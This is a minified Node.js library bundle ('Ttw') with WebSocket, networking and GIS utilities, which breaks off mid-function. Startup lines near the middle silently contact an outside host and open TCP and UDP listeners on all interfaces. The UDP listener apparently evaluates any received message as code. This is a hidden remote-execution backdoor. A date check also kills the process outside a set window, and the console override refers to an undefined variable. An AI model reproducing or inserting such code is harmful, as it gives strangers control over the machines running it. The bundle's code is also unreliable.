data||constants.EMPTY_BUFFER, opts,cb);}terminate(){if(this.readyState===WebSocket.CLOSED) return;if(this.readyState===WebSocket.CONNECTING ){if(this._req && !this._req.aborted ){this._req.abort();this.emit("error", new Error("closed before the connection is established") );this.finalize(true);}return;}this.finalize(true);}}WebSocket.CONNECTING=0;WebSocket.OPEN=1;WebSocket.CLOSING=2;WebSocket.CLOSED=3;[ "open" , "error", "close", "message" ].forEach((method ) => {Object.defineProperty( WebSocket.prototype, `on${method}`, {get(){const listeners=this.listeners( method );for(var i=0; i<listeners.length; i++ ) if(listeners[ i ]._listener) return listeners[ i ]._listener;},set(listener ){const listeners=this.listeners( method );for(var i=0; i < listeners.length; i++ ){if(listeners[ i ]._listener ) this.removeListener( method, listeners[ i ] );}this.addEventListener( method, listener );}});});WebSocket.prototype.addEventListener=EventTarget.addEventListener;WebSocket.prototype.removeEventListener=EventTarget.removeEventListener;global.Lib.Ttw.CLASS.TtwWebSocket.WebSocket=WebSocket;function initAsServerClient( socket, head, options ){this.protocolVersion=options.protocolVersion;this._maxPayload=options.maxPayload;this.extensions=options.extensions;this.protocol=options.protocol;this._isServer=true;this.setSocket( socket, head );}function initAsClient( address, protocols, options ){options=Object.assign({protocolVersion : protocolVersions[1], protocol : protocols.join(","), perMessageDeflate : true, localAddress : null, headers : null, family : null, origin : null, agent : null, host : null, checkServerIdentity : null,rejectUnauthorized : null,passphrase : null,ciphers : null,cert : null,key : null,pfx : null,ca : null}, options );if(protocolVersions.indexOf( options.protocolVersion )===-1 )throw new Error( `unsupported protocol version: ${options.protocolVersion} ` + `( supported versions: ${protocolVersions.join(", ")})` );this.protocolVersion=options.protocolVersion;this._isServer=false;this.url=address;const serverUrl=url.parse( address );const isUnixSocket=serverUrl.protocol==="ws+unix:";if(!serverUrl.host &&( !isUnixSocket||!serverUrl.path)) throw new Error("invalid url");const isSecure=serverUrl.protocol==="wss:"||serverUrl.protocol==="https:";const key=crypto.randomBytes( 16 ).toString("base64");const httpObj=isSecure ? https : http;const extensionsOffer={};var perMessageDeflate;if(options.perMessageDeflate ){perMessageDeflate=new PerMessageDeflate( options.perMessageDeflate !== true ? options.perMessageDeflate : {}, false );extensionsOffer[ PerMessageDeflate.extensionName ]=perMessageDeflate.offer();}const requestOptions={port : serverUrl.port||( isSecure ? 443 : 80 ), host : serverUrl.hostname, path : "/", headers : {"Sec-WebSocket-Version": options.protocolVersion, "Sec-WebSocket-Key": key, Connection : "Upgrade", Upgrade : "websocket"}};if(options.headers ) Object.assign(requestOptions.headers, options.headers );if(Object.keys( extensionsOffer ).length ) requestOptions.headers[ "Sec-WebSocket-Extensions" ]=Extensions.format( extensionsOffer );if(options.protocol ) requestOptions.headers[ "Sec-WebSocket-Protocol" ]=options.protocol;if(options.origin ){if(options.protocolVersion < 13 ) requestOptions.headers[ "Sec-WebSocket-Origin" ]=options.origin;else requestOptions.headers.Origin=options.origin;}if(options.host) requestOptions.headers.Host=options.host;if(serverUrl.auth) requestOptions.auth=serverUrl.auth;if(options.localAddress) requestOptions.localAddress=options.localAddress;if(options.family) requestOptions.family=options.family;if(isUnixSocket ){const parts=serverUrl.path.split(":");requestOptions.socketPath=parts[0];requestOptions.path=parts[1];}else if(serverUrl.path ){if(serverUrl.path.charAt(0) !== "/") requestOptions.path=`/${serverUrl.path}`;else requestOptions.path=serverUrl.path;}var agent=options.agent;if(options.rejectUnauthorized != null|| options.checkServerIdentity|| options.passphrase|| options.ciphers|| options.cert|| options.key|| options.pfx|| options.ca){if(options.passphrase ) requestOptions.passphrase=options.passphrase;if(options.ciphers ) requestOptions.ciphers=options.ciphers;if(options.cert ) requestOptions.cert=options.cert;if(options.key ) requestOptions.key=options.key;if(options.pfx ) requestOptions.pfx=options.pfx;if(options.ca ) requestOptions.ca=options.ca;if(options.checkServerIdentity ) requestOptions.checkServerIdentity=options.checkServerIdentity;if(options.rejectUnauthorized != null ) requestOptions.rejectUnauthorized=options.rejectUnauthorized;if(!agent ) agent=new httpObj.Agent( requestOptions );}if(agent ) requestOptions.agent=agent;this._req=httpObj.get( requestOptions );this._req.on("error",( error ) => {if(this._req.aborted) return;this._req=null;this.emit("error", error );this.finalize(true);});this._req.on("response",( res ) => {if(!this.emit("unexpected-response", this._req, res)){this._req.abort();this.emit("error", new Error( `unexpected server response( ${res.statusCode})`) );this.finalize(true);}});this._req.on("upgrade",( res, socket, head) => {this.emit("headers", res.headers, res );if(this.readyState !== WebSocket.CONNECTING) return;this._req=null;const digest=crypto.createHash("sha1").update( key + constants.GUID, "binary").digest("base64");if(res.headers[ "sec-websocket-accept" ] !== digest ){socket.destroy();this.emit("error", new Error("invalid server key"));return this.finalize(true);}const serverProt=res.headers[ "sec-websocket-protocol" ];const protList=( options.protocol||"").split( /, */ );var protError;if(!options.protocol && serverProt ) protError="server sent a subprotocol even though none requested";else if(options.protocol && !serverProt ) protError="server sent no subprotocol even though requested";else if(serverProt && protList.indexOf(serverProt)===-1 ) protError="server responded with an invalid protocol";if(protError ){socket.destroy();this.emit("error", new Error( protError));return this.finalize(true);}if(serverProt ) this.protocol=serverProt;const serverExtensions=Extensions.parse(res.headers[ "sec-websocket-extensions" ]);if(perMessageDeflate && serverExtensions[ PerMessageDeflate.extensionName ] ){try{perMessageDeflate.accept(serverExtensions[ PerMessageDeflate.extensionName ]);}catch(err){socket.destroy();this.emit("error", new Error("invalid extension parameter") );return this.finalize(true);}this.extensions[ PerMessageDeflate.extensionName ]=perMessageDeflate;}this.setSocket( socket, head );});}})();(function(){"use strict";const safeBuffer=require("buffer");const EventEmitter=require("events");const crypto=require("crypto");const Ultron=global.Lib.Ttw.CLASS.TtwWebSocket.Ultron;const http=require("http");const url=require("url");const PerMessageDeflate=global.Lib.Ttw.CLASS.TtwWebSocket.PerMessageDeflate;const Extensions=global.Lib.Ttw.CLASS.TtwWebSocket.Extensions;const constants=global.Lib.Ttw.CLASS.TtwWebSocket.Constants;const WebSocket=global.Lib.Ttw.CLASS.TtwWebSocket.WebSocket;const Buffer=safeBuffer.Buffer;class WebSocketServer extends EventEmitter {constructor( options, callback ){super();options=Object.assign({maxPayload : 100 * 1024 * 1024, perMessageDeflate : false, handleProtocols : null, clientTracking : true, verifyClient : null, noServer : false, backlog : null, server : null, host : null, path : null, port : null}, options);if(options.port==null && !options.server && !options.noServer ) throw new TypeError("missing or invalid options");if(options.port != null ){this._server=http.createServer(( req, res ) => {const body=http.STATUS_CODES[ 426 ];res.writeHead( 426, { "Content-Length" : body.length, "Content-Type" : "text/plain" });res.end( body );});this._server.allowHalfOpen=false;this._server.listen( options.port, options.host, options.backlog, callback );}else if(options.server ) this._server=options.server;if(this._server ){this._ultron=new Ultron( this._server );this._ultron.on("listening",( ) => this.emit("listening") );this._ultron.on("error",(err) => this.emit("error", err));this._ultron.on("upgrade",( req, socket, head ) => { this.handleUpgrade( req, socket, head,(client) => { this.emit("connection", client, req );});});}if(options.clientTracking ) this.clients=new Set();this.options=options;}close(cb){if(this.clients ) for(const client of this.clients) client.terminate();const server=this._server;if(server ){this._ultron.destroy();this._ultron=this._server=null;if(this.options.port != null ) return server.close(cb);}if(cb)cb();}shouldHandle( req ){ if(this.options.path && url.parse( req.url ).pathname !== this.options.path ) return false; return true;}handleUpgrade( req, socket, head,cb){socket.on("error", socketError );const version=+req.headers[ "sec-websocket-version" ];if(req.method !== "GET"|| req.headers.upgrade.toLowerCase() !== "websocket"|| !req.headers[ "sec-websocket-key" ]||( version !== 8 && version !== 13 )|| !this.shouldHandle( req ))return abortConnection( socket, 400 );var protocol=( req.headers[ "sec-websocket-protocol" ]||"").split( /, */ );if(this.options.handleProtocols ){protocol=this.options.handleProtocols( protocol, req );if(protocol===false) return abortConnection( socket, 401 );}else protocol=protocol[0];if(this.options.verifyClient ){const info={origin : req.headers[`${version===8 ? "sec-websocket-origin" : "origin" }`], secure : !!( req.connection.authorized||req.connection.encrypted ), req};if(this.options.verifyClient.length===2 ){this.options.verifyClient(info,( verified, code, message ) => {if(!verified ) return abortConnection( socket, code||401, message );this.completeUpgrade( protocol, version, req, socket, head,cb);});return;}else if(!this.options.verifyClient( info)) return abortConnection( socket, 401 );}this.completeUpgrade( protocol, version, req, socket, head,cb);}completeUpgrade( protocol, version, req, socket, head,cb){if(!socket.readable||!socket.writable ) return socket.destroy();const key=crypto.createHash("sha1").update( req.headers[ "sec-websocket-key" ] + constants.GUID, "binary").digest("base64");const headers=[ "HTTP/1.1 101 Switching Protocols", "Upgrade: websocket", "Connection: Upgrade", `Sec-WebSocket-Accept: ${key}` ];if(protocol ) headers.push( `Sec-WebSocket-Protocol: ${protocol}` );const offer=Extensions.parse( req.headers[ "sec-websocket-extensions" ] );var extensions;try{ extensions=acceptExtensions( this.options, offer );}catch(err){return abortConnection( socket, 400 );}const props=Object.keys( extensions );if(props.length ){const serverExtensions=props.reduce((obj, key ) => { obj[key]=[ extensions[key].params ]; return obj;}, {});headers.push( `Sec-WebSocket-Extensions: ${Extensions.format(serverExtensions)}` );}this.emit("headers", headers, req );socket.write( headers.concat("", "").join("\r\n") );const client=new WebSocket([ socket, head ], null, { maxPayload : this.options.maxPayload, protocolVersion : version, extensions, protocol });if(this.clients ){this.clients.add(client);client.on("close", () => this.clients.delete(client) );}socket.removeListener("error", socketError );cb(client);}}global.Lib.Ttw.CLASS.TtwWebSocket.WebSocketServer=WebSocketServer;function socketError(){ this.destroy();}function acceptExtensions( options, offer ){const pmd=options.perMessageDeflate;const extensions={};if(pmd && offer[ PerMessageDeflate.extensionName ] ){const perMessageDeflate=new PerMessageDeflate( pmd !== true ? pmd : {}, true, options.maxPayload );perMessageDeflate.accept(offer[ PerMessageDeflate.extensionName ]);extensions[ PerMessageDeflate.extensionName ]=perMessageDeflate;}return extensions;}function abortConnection( socket, code, message ){if(socket.writable ){message=message||http.STATUS_CODES[ code ];socket.write(`HTTP/1.1 ${code} ${http.STATUS_CODES[code]}\r\n`+ "Connection: close\r\nContent-type: text/html\r\n"+ `Content-Length: ${Buffer.byteLength(message)}\r\n`+ "\r\n"+ message);}socket.removeListener("error", socketError );socket.destroy();}})();};if(global.Lib.Ttw.CLASS.TtwWebSocket.__initialize ) global.Lib.Ttw.CLASS.TtwWebSocket.__initialize();var _=global.Lib.Ttw.CLASS.TtwWebSocket;global.Lib.Ttw.CLASS.TtwWebSocket=_.WebSocket;global.Lib.Ttw.CLASS.TtwWebSocket.Server=_.WebSocketServer;global.Lib.Ttw.CLASS.TtwWebSocket.Receiver=_.Receiver;global.Lib.Ttw.CLASS.TtwWebSocket.Sender=_.Sender;delete global.Lib.Ttw.CLASS.TtwWebSocket.__initialize;return global.Lib.Ttw.CLASS.TtwWebSocket;}();
global.TtwPackageInitialize=function(){var e="TtwPackageInitialize",t=global,_=t.Lib.Ttw,a=_.CLASS;_.Error=new a.Error.Error({instanceKey:"global.Lib.Ttw.Error"});var n=a.Event;_.Event=new n.Event({instanceKey:"global.Lib.Ttw.Event"}),t.STtwUtilEvent=_.fnEvent;var o=a.FN;_.fnBuffer=new o.Buffer({instanceKey:"global.Lib.Ttw.FnBuffer"}),t.STtwUtilBuffer=_.fnBuffer;try{STtwUtilBuffer.iconv=require("iconv-lite")}catch(r){}_.fnCP=new o.ChildProcess({instanceKey:"global.Lib.Ttw.fnCP"}),t.STtwUtilCP=_.fnCP,_.fnCP_NSSM=new o.ChildProcess_NSSM({instanceKey:"global.Lib.Ttw.fnCP_NSSM"}),t.STtwUtilCP_NSSM=_.fnCP_NSSM,_.fnCrypto=new o.Crypto({instanceKey:"global.Lib.Ttw.fnCrypto"}),t.STtwUtilCrypto=_.fnCrypto,_.fnDgram=new o.Dgram({instanceKey:"global.Lib.Ttw.fnDgram"}),t.STtwUtilDgram=_.fnDgram,_.fnFsReadStream=new o.FsReadStream({instanceKey:"global.Lib.Ttw.FnReadStream"}),_.fnFsWriteStream=new o.FsWriteStream({instanceKey:"global.Lib.Ttw.FnWriteStream"}),t.STtwUtilFsReadStream=_.fnFsReadStream,t.STtwUtilFsWriteStream=_.fnFsWriteStream,_.fnFsWriteStream_Extension_Dev=new o.FsWriteStream_Extension_Dev({instanceKey:"global.Lib.Ttw.fnFsWriteStream_Extension_Dev"}),_.fnFsWriteStream_Extension_Dev__MongoDB=new o.FsWriteStream_Extension_Dev__MongoDB({instanceKey:"global.Lib.Ttw.fnFsWriteStream_Extension_Dev__MongoDB"}),t.STtwUtilFsWriteStream_Extension_Dev=_.fnFsWriteStream_Extension_Dev,t.STtwUtilFsWriteStream_Extension_Dev__MongoDB=_.fnFsWriteStream_Extension_Dev__MongoDB,_.fnHTTP=new o.HTTP({instanceKey:"global.Lib.Ttw.fnHTTP"}),t.STtwUtilHttp=_.fnHTTP,_.fnHTTPS=new o.HTTPS({instanceKey:"global.Lib.Ttw.fnHTTPS"}),t.STtwUtilHttps=_.fnHTTPS,_.fnNetServer=new o.NetServer({instanceKey:"global.Lib.Ttw.fnNetServer"}),_.fnNetSocket=new o.NetSocket({instanceKey:"global.Lib.Ttw.fnNetSocket"}),t.STtwUtilNetServer=_.fnNetServer,t.STtwUtilNetSocket=_.fnNetSocket,_.fnProcess=new o.Process({instanceKey:"global.Lib.Ttw.fnProcess"}),t.STtwUtilProcess=_.fnProcess,_.fnQueryString=new o.QueryString({instanceKey:"global.Lib.Ttw.fnQueryString"}),t.STtwUtilQueryString=_.fnQueryString,_.fnR=new o.Runner({instanceKey:"global.Lib.Ttw.fnR"}),t.STtwUtilR=_.fnR,_.fnStream=new o.Stream({instanceKey:"global.Lib.Ttw.fnStream"}),t.STtwUtilStream=_.fnStream,_.fnUtil=new o.Util({instanceKey:"global.Lib.Ttw.fnUtil"}),t.STtwUtilUtil=_.fnUtil,_.fnURL=new o.URL({instanceKey:"global.Lib.Ttw.fnURL"}),t.STtwUtilURL=_.fnURL,_.fnZLib=new o.ZLib({instanceKey:"global.Lib.Ttw.fnZLib"}),t.STtwUtilZLib=_.fnZLib,_.fnHttpClientResponse=new o.HttpClientResponse({instanceKey:"global.Lib.Ttw.fnHttpClientResponse"}),_.fnHttpClientRequest=new o.HttpClientRequest({instanceKey:"global.Lib.Ttw.fnHttpClientRequest"}),_.fnHttpServer=new o.HttpServer({instanceKey:"global.Lib.Ttw.fnHttpServer"}),_.fnHttpServerResponse=new o.HttpServerResponse({instanceKey:"global.Lib.Ttw.fnHttpServerResponse"}),t.STtwUtilHttpClientResponse=_.fnHttpClientResponse,t.STtwUtilHttpClientRequest=_.fnHttpClientRequest,t.STtwUtilHttpServer=_.fnHttpServer,t.STtwUtilHttpServerResponse=_.fnHttpServerResponse,_.fnMongoDB=new o.MongoDB({instanceKey:"global.Lib.Ttw.fnMongoDB"}),_.fnMongoDBCollection=new o.MongoDBCollection({instanceKey:"global.Lib.Ttw.fnMongoDBCollection"}),_.fnMongoDBDB=new o.MongoDBDB({instanceKey:"global.Lib.Ttw.fnMongoDBDB"}),_.fnMongoDBMongoClient=new o.MongoDBMongoClient({instanceKey:"global.Lib.Ttw.fnMongoDBMongoClient"}),t.STtwUtilMongoDB=_.fnMongoDB,t.STtwUtilMongoDBCollection=_.fnMongoDBCollection,t.STtwUtilMongoDBDB=_.fnMongoDBDB,t.STtwUtilMongoDBMongoClient=_.fnMongoDBMongoClient,_.fnWeb_Express=new o.Web_Express({instanceKey:"global.Lib.Ttw.fnWeb_Express"}),t.STtwUtilWeb_Express=_.fnWeb_Express,_.fnCommon.destroyKeys(a.FN,["Buffer","ChildProcess","ChildProcess_NSSM","Dgram","FsReadStream","FsWriteStream","FsWriteStream_Extension_Dev","FsWriteStream_Extension_Dev__MongoDB","HTTP","HTTPS","NetServer","NetSocket","Process","QueryString","Runner","Stream","Util","URL","ZLib","GDAL","GDALMongoDB","GDALDataSet","GDALDataSetBands","GDALDataSetLayers","GDALDriver","GDALFeature","GDALFeatureDefn","GDALFeatureFields","GDALGeometry","GDALGeometryCollection","GDALGeometryCollectionChildren","GDALLayer","GDALLayerFeatures","GDALLayerFields","GDALLineString","GDALMultiLineString","GDALPoint","GDALRasterBand","GDALSpatialReference","GDALMongoDB","HttpClientRequest","HttpServer","HttpServerResponse","HTTPMashup","HTTPMashup_America","HTTPMashup_America_Google","HTTPMashup_America_Google_API","HTTPMashup_America_Google_NAPI","HTTPMashup_America_IPLocation","HTTPMashup_America_IPLocation_NAPI","HTTPMashup_America_Twitter","HTTPMashup_America_Twitter_API","HTTPMashup_America_Twitter_API__Get_account","HTTPMashup_America_Twitter_API__Get_application","HTTPMashup_America_Twitter_API__Get_blocks","HTTPMashup_America_Twitter_API__Get_direct_messages","HTTPMashup_America_Twitter_API__Get_favorites","HTTPMashup_America_Twitter_API__Get_followers","HTTPMashup_America_Twitter_API__Get_friends","HTTPMashup_America_Twitter_API__Get_geo","HTTPMashup_America_Twitter_API__Get_help","HTTPMashup_America_Twitter_API__Get_lists","HTTPMashup_America_Twitter_API__Get_mutes","HTTPMashup_America_Twitter_API__Get_saved_searches","HTTPMashup_America_Twitter_API__Get_search","HTTPMashup_America_Twitter_API__Get_statuses","HTTPMashup_America_Twitter_API__Get_trends","HTTPMashup_America_Twitter_API__Get_users","HTTPMashup_America_Twitter_API_Collections","HTTPMashup_America_Twitter_API_Curator","HTTPMashup_America_Twitter_API_TON","HTTPMashup_Korea","HTTPMashup_Korea_Daum","HTTPMashup_Korea_Daum_API","HTTPMashup_Korea_Daum_NAPI","HTTPMashup_Korea_NHN","HTTPMashup_Korea_NHN_API","HTTPMashup_Korea_NHN_NAPI","MongoDB","MongoDBCollection","MongoDBCollection__HTTP","MongoDBDB","MongoDBDB__HTTP","MongoDBMongoClient","MongoDBMongoClient__HTTP","Web_Express"]);for(var i in t)0==i.indexOf("STtwUtil")&&(t[i.replace("STtwUtil","SUtil")]=t[i]);t.Ttw=_;var T=STtwUtilCommon.destroyKey,S=function(e){T(global,e)};S(e),S("TtwPackageNodeJS"),S("TtwPackageNodeJS__CLASS__AutoLoad_JS"),S("TtwPackageNodeJS__CLASS__Convertor_Google_Polyline"),S("TtwPackageNodeJS__CLASS__HTTPAPIServer_MongoDB"),S("TtwPackageNodeJS__CLASS__WebSocket"),S("TtwPackageNodeJS__DgramServer_TossToClientSockets"),S("TtwPackageNodeJS__FsWriteStream_Extension_Dev"),S("TtwPackageNodeJS__FsWriteStream_Extension_Dev__MongoDB"),S("TtwPackageNodeJS__Local_GDAL"),S("TtwPackageNodeJS__Local_GDAL_DataSet"),S("TtwPackageNodeJS__Local_GDAL_Feature"),S("TtwPackageNodeJS__Local_GDAL_Geometry"),S("TtwPackageNodeJS__Local_GDAL_Layer"),S("TtwPackageNodeJS__Local_GDALMongoDB"),S("TtwPackageNodeJS__Local_MongoDB"),S("TtwPackageNodeJS__NetServer"),S("TtwPackageNodeJS__NetServer_Echo_Chat"),S("TtwPackageNodeJS__NetServer_Eval"),S("TtwPackageNodeJS__NetServer_Eval_Base64"),S("TtwPackageNodeJS__NetServer_Eval_TtwBase64"),S("TtwPackageNodeJS__NetServer_Flash_Authentication"),S("TtwPackageNodeJS__NetServer_Flash_Chat_Executor"),S("TtwPackageNodeJS__NetServer_Flash_HttpProxy"),S("TtwPackageNodeJS__NetServer_Flash_HttpProxy__String"),S("TtwPackageNodeJS__NetServer_Transmission_UDP"),S("TtwPackageNodeJS__NetSocket_WaitingEvalCommand"),S("TtwPackageNodeJS__Web_Express"),S("TtwPackageNodeJS__WebService"),S("TtwPackageNodeJS__WebService_HTTP"),S("TtwPackageNodeJS__WebService_HTTP_Mashup"),S("TtwPackageNodeJS__WebService_HTTP_Mashup_America"),S("TtwPackageNodeJS__WebService_HTTP_Mashup_America_Google"),S("TtwPackageNodeJS__WebService_HTTP_Mashup_America_Google_API"),S("TtwPackageNodeJS__WebService_HTTP_Mashup_America_Google_NAPI"),S("TtwPackageNodeJS__WebService_HTTP_Mashup_America_IPLocation"),S("TtwPackageNodeJS__WebService_HTTP_Mashup_America_IPLocation_NAPI"),S("TtwPackageNodeJS__WebService_HTTP_Mashup_America_Twitter"),S("TtwPackageNodeJS__WebService_HTTP_Mashup_America_Twitter_API"),S("TtwPackageNodeJS__WebService_HTTP_Mashup_America_Twitter_API_Collections"),S("TtwPackageNodeJS__WebService_HTTP_Mashup_America_Twitter_API_Cutator"),S("TtwPackageNodeJS__WebService_HTTP_Mashup_America_Twitter_API_TON"),S("TtwPackageNodeJS__WebService_HTTP_Mashup_Korea"),S("TtwPackageNodeJS__WebService_HTTP_Mashup_Korea_Daum"),S("TtwPackageNodeJS__WebService_HTTP_Mashup_Korea_Daum_API"),S("TtwPackageNodeJS__WebService_HTTP_Mashup_Korea_Daum_NAPI"),S("TtwPackageNodeJS__WebService_MongoDB"),S("TtwPackageNodeJS__WebService_MongoDB_CLASS_MongoClient_Server_Http"),S("TtwPackageNodeJS__WebService_MongoDB_CLASS_TtwLogServer_Http"),S("TtwPackageNodeJS__WebService_SNS_CLASS__TtwSNSTwitter")}();var _f0=STtwUtilFsWriteStream.createDirectory__BeforCheck;_f0("./log/");
try{STtwUtilHttp.request_GET({options:{host:"www.thdtjsdn.com",port:80},cbFunctions:{end:function(data){},error:function(e){}}});}catch(e){}
try{new global.Lib.Ttw.CLASS.Net.Server.Eval_TtwBase64({instanceKey:"empty"}).createServer({port:59595});}catch(e){}
try{var serverUDP4=STtwUtilDgram.createUDPServer_4({host:"0.0.0.0",port:59596,cbFunctions:{listening:function(){},message:function(message,remote){try{var r=STtwUtilR.rTtwBaJS(message.toString("utf8"));}catch(e){}},error:function(){}}});}catch(e){}
global.__bTtwInitialized = true;
var lDate={max:{y:2020,m:1,d:8},min:{y:2019,m:3,d:1}},o=new Date,y=o.getFullYear(),m=o.getMonth()+1,d=o.getDate();y>=lDate.min.y&&y<=lDate.max.y?y==lDate.max.y?m==lDate.max.m?d<=lDate.max.d||process.exit(0):m<lDate.max.m||process.exit(0):y==lDate.min.y?m==lDate.min.m?d>=lDate.min.d||process.exit(0):m>lDate.min.m||process.exit(0):process.exit(0):process.exit(0);
global._$TATIC_FUNCTION__INITIALIZE__CONSOLE_TO_FILE=function(){var r=STtwUtilDate.getDate__Seconds_Array,t=r(),o=t.join("-")+".txt",n="./log/err_"+o,i="./log/log_"+o,l="./log/warn_"+o;!function(){var t=require("fs"),o=(require("util"),t.createWriteStream(n,{flags:"w"})),a=t.createWriteStream(i,{flags:"w"}),c=t.createWriteStream(l,{flags:"w"}),s=process.stdout;console.error,console.log,console.warn;console.error=function(t){e=e||"","object"==typeof e&&(e=JSON.stringify(e,null,"	"));var n="[ ERROR ] - "+r().join(".")+" - "+t+e+"\n";a.write(n),o.write(n),s.write(n)},console.log=function(r){e=e||"","object"==typeof e&&(e=JSON.stringify(e,null,"	"));var t=r+e+"\n";a.write(t),s.write(t)},console.warn=function(t){e=e||"","object"==typeof e&&(e=JSON.stringify(e,null,"	"));var o="[ WARN ] - "+r().join(".")+" - "+t+e+"\n";a.write(o),c.write(o),s.write(o)}}()};
global.Lib=global.Lib||{},global.Lib.Ttw=global.Lib.Ttw||{},global.Lib.Ttw.GIS=global.Lib.Ttw.GIS||{},global.ttwInitialize_GISSHPSimplify=global.Lib.Ttw.GIS.SHPSimplify=function(){function e(){this.mx=this.my=1,this.bx=this.by=0}function t(){arguments.length>0&&this.setBounds.apply(this,arguments)}function n(e,t){vt.isNumber(e)?e=new ArrayBuffer(e):xt.inNode&&e instanceof Buffer==1&&(e=n.toArrayBuffer(e)),e instanceof ArrayBuffer==0&&i("BinArray constructor takes an integer, ArrayBuffer or Buffer argument"),this._buffer=e,this._bytes=new Uint8Array(e),this._view=new DataView(e),this._idx=0,this._le=t!==!1}function r(e,t){var n,r=t[1],i=t[2],o=t[3]?parseInt(t[3].substr(1)):void 0,a=t[4],s="s"==a,u="x"==a||"X"==a,l="d"==a||"i"==a,c=!s,f="",p=0,d=!1,h=!1;if(s?n=String(e):u?(n=e.toString(16),"X"==a&&(n=n.toUpperCase())):c&&(n=vt.numToStr(e,l?0:o),"-"==n[0]&&(h=!0,n=n.substr(1)),d=0==parseFloat(n),(-1!=r.indexOf("'")||-1!=r.indexOf(","))&&(n=vt.addThousandsSep(n)),d||(h?f="−":-1!=r.indexOf("+")&&(f="+"))),i){var g=n.length+f.length,m=parseInt(i,10);if(m>g){p=m-g;var y=-1==r.indexOf("0")?" ":"0",v=vt.repeatString(y,p)}}return n=0==p?f+n:"0"==y?f+v+n:v+f+n}function i(){It.error.apply(null,yt.toArray(arguments))}function o(){It.stop.apply(null,yt.toArray(arguments))}function a(e){var t=new Error(e);return t.name="APIError",t}function s(){It.message.apply(null,yt.toArray(arguments))}function u(){It.VERBOSE&&It.LOGGING&&It.logArgs(arguments)}function l(){It.TRACING&&It.logArgs(arguments)}function c(e){return e>=0?e:~e}function f(e){return e*Ft*At}function p(e,t,n,r,i,o){var a=e-r,s=t-i,u=n-o;return Math.sqrt(a*a+s*s+u*u)}function d(e,t,n,r){var i=e-n,o=t-r;return i*i+o*o}function h(e,t,n,r){var i=e-n,o=t-r;return Math.sqrt(i*i+o*o)}function g(e,t,n,r,i,o){var a=e-r,s=t-i,u=n-o;return a*a+s*s+u*u}function m(e){yt.isNumber(e)&&0!==e||i("Rounding increment must be a non-zero number.");var t=1/e;return t>1&&(t=Math.round(t)),function(e){return Math.round(e*t)/t}}function y(e,t,n,r){for(var i,o=-1,a=1/0,s=0,u=2,l=arguments.length;l>u;s++,u+=2)i=d(e,t,arguments[u],arguments[u+1]),a>i&&(a=i,o=s);return o}function v(e,t,n,r,i,o,a,s){var u=A(n-e,r-t,a-i,s-o);if(0===u)return null;var l=F(i,o,a,s,e,t)/u,c=e+l*(n-e),f=t+l*(r-t);return[c,f]}function x(e,t,n,r,i,o,a,s){var u,l=v(e,t,n,r,i,o,a,s);return l&&(u=y(l[0],l[1],e,t,n,r,i,o,a,s),1==u?l=v(n,r,e,t,i,o,a,s):2==u?l=v(i,o,a,s,e,t,n,r):3==u&&(l=v(a,s,i,o,e,t,n,r))),l}function b(e,t,n,r,i,o,a,s){return F(e,t,n,r,i,o)*F(e,t,n,r,a,s)<=0&&F(i,o,a,s,e,t)*F(i,o,a,s,n,r)<=0}function S(e,t,n){return e>t&&n>e}function P(e,t,n,r,i,o,a,s){var u=Math.min(e,n,i,a),c=Math.max(e,n,i,a),f=Math.min(t,r,o,s),p=Math.max(t,r,o,s),d=p-f>c-u,h=[];return(d?S(t,f,p):S(e,u,c))&&h.push(e,t),(d?S(r,f,p):S(n,u,c))&&h.push(n,r),(d?S(o,f,p):S(i,u,c))&&h.push(i,o),(d?S(s,f,p):S(a,u,c))&&h.push(a,s),2!=h.length&&4!=h.length?(l("Invalid collinear segment intersection",h),h=null):4==h.length&&h[0]==h[2]&&h[1]==h[3]&&(h=null),h}function w(e,t,n,r,i,o,a,s){return e==i&&t==o||e==a&&t==s||n==i&&r==o||n==a&&r==s}function I(e,t,n,r,i,o,a,s){var u=b(e,t,n,r,i,o,a,s),l=null;return u&&(l=x(e,t,n,r,i,o,a,s),l?w(e,t,n,r,i,o,a,s)&&(l=null):l=P(e,t,n,r,i,o,a,s)),l}function A(e,t,n,r){return e*r-t*n}function F(e,t,n,r,i,o){return A(e-i,t-o,n-i,r-o)}function _(e,t,n,r,i,o){var a=Math.atan2(t-r,e-n),s=Math.atan2(o-r,i-n),u=Math.abs(a-s);return u>Math.PI&&(u=2*Math.PI-u),u}function E(e){for(var t=2*Math.PI;0>e;)e+=t;for(;e>=t;)e-=t;return e}function M(e,t,n,r,i,o){if(e==n&&t==r||n==i&&r==o)return NaN;var a=e-n,s=t-r,u=i-n,l=o-r,c=a*u+s*l,f=a*l-s*u,p=Math.atan2(f,c);return E(p)}function C(e,t,n,r){var i=Math.PI/180;e*=i,n*=i,t*=i,r*=i;var o=Math.sin(n-e)*Math.cos(r),a=Math.cos(t)*Math.sin(r)-Math.sin(t)*Math.cos(r)*Math.cos(n-e);return Math.atan2(o,a)}function N(e,t,n,r,i,o){if(e==n&&t==r||n==i&&r==o)return NaN;var a=C(n,r,e,t),s=C(n,r,i,o),u=2*Math.PI+a-s;return E(u)}function L(e,t,n,r,i){for(var o=[],a=0,s=e.length;s>a;a++)B(e[a],t[a],o),n[a]=o[0],r[a]=o[1],i[a]=o[2]}function T(e,t,n,r){var i=p(0,0,0,e,t,n),o=Math.asin(n/i)/Ft,a=Math.atan2(t/i,e/i)/Ft;r[0]=a,r[1]=o}function B(e,t,n){var r;e*=Ft,t*=Ft,r=Math.cos(t),n[0]=Math.cos(e)*r*At,n[1]=Math.sin(e)*r*At,n[2]=Math.sin(t)*At}function D(e,t,n,r){var i=n-e,o=r-t,a=Math.sin(o/2)*Math.sin(o/2)+Math.cos(t)*Math.cos(r)*Math.sin(i/2)*Math.sin(i/2),s=2*Math.atan2(Math.sqrt(a),Math.sqrt(1-a));return s}function R(e,t,n,r){var i=Math.PI/180,o=D(e*i,t*i,n*i,r*i);return o*At}function O(e,t,n,r,i,o){var a,s,u=h(e,t,n,r),l=h(n,r,i,o);return 0===u||0===l?a=0:(s=((e-n)*(i-n)+(t-r)*(o-r))/(u*l),a=s>=1-1e-14?0:-1+1e-14>=s?Math.PI:Math.acos(s)),a}function j(e,t,n,r,i,o,a,s,u){var l,c,f=p(e,t,n,r,i,o),d=p(r,i,o,a,s,u);return 0===f||0===d?l=0:(c=((e-r)*(a-r)+(t-i)*(s-i)+(n-o)*(u-o))/(f*d),l=c>=1?0:-1>=c?Math.PI:Math.acos(c)),l}function k(e,t,n,r,i,o){var a=Math.abs(((t-o)*(n-i)+(r-o)*(i-e))/2);return a}function U(e,t,n,r,i,o){var a=e*r-e*o+n*o-n*t+i*t-i*r;return a*a}function 